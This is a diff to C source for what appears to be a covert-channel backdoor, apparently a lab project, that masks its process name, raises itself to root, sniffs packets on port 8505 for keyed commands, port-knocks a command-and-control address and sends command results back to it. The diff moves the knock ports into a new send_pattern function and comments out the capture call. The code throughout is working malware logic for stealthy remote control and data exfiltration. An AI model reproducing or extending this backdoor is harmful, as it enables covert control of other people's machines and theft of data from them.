@@ -1,6 +1,6 @@
 #include "main.h"
 
-#define FILTER "tcp and port 8505"
+#define FILTER(port) "tcp and port " port
 #define PAYLOAD_KEY "8505"
 #define PORT "8505"
 #define SHPORT 8505
@@ -29,26 +29,23 @@ void ParsePayload(const u_char *payload, int len);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id);
+void send_pattern(char *sip, char *dip, unsigned short sport, unsigned short dport,unsigned char *data);
 void recv_results(char* sip, unsigned short sport);
 void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename);
 int rand_delay(int delay);
 
 int pattern[2];
-int knocking[2];
 
 int main(int argc, char **argv){
     strcpy(argv[0], MASK);
     //change the UID/GID to 0 to raise privs
     setuid(0);
     setgid(0);
-    char *c = "c";
-    char *sip = CNCIP;
-    char *dip = INFECTEDIP;
-    unsigned short sport = SHPORT;
-    unsigned short dport = SHPORT;
-    unsigned char data[BUFSIZE] = "ls";
-	
-    Packetcapture();
+    pattern[0] = 8506;
+    pattern[1] = 8507;
+    printf("%d", pattern[0]);
+    printf("%d", pattern[1]);
+    //Packetcapture();
 
     return 0;
 }
@@ -73,7 +70,7 @@ int Packetcapture(){
         exit(0);
     }
 
-    if(pcap_compile(interfaceinfo, &fp, FILTER, 0, netp) == -1){
+    if(pcap_compile(interfaceinfo, &fp, FILTER(PORT), 0, netp) == -1){
         perror("pcap_comile");
     }
 
@@ -213,14 +210,18 @@ void ParsePayload(const u_char *payload, int len){
     unsigned short dport = SHPORT;
     unsigned char data[BUFSIZE] = "ls";
     printf("PORT KNOCKING\n");
-    covert_send(srcip, destip, sport, 8506, data, 2);
-    covert_send(srcip, destip, sport, 8507, data, 2);
+    send_pattern(srcip, destip, sport, dport, data);
     printf("RETURNING RESULTS\n");
     send_results(srcip, destip, sport, dport, RESULT_FILE);
     system(TURNOFF(CNCIP));
     printf("\n");
     printf("\n");
     printf("Waiting for new command\n");
+}
+
+void send_pattern(char *sip, char *dip, unsigned short sport, unsigned short dport,unsigned char *data){
+    covert_send(sip, dip, sport, pattern[0], data, 2);
+    covert_send(sip, dip, sport, pattern[1], data, 2);
 }
 
 void recv_results(char* sip, unsigned short sport) {
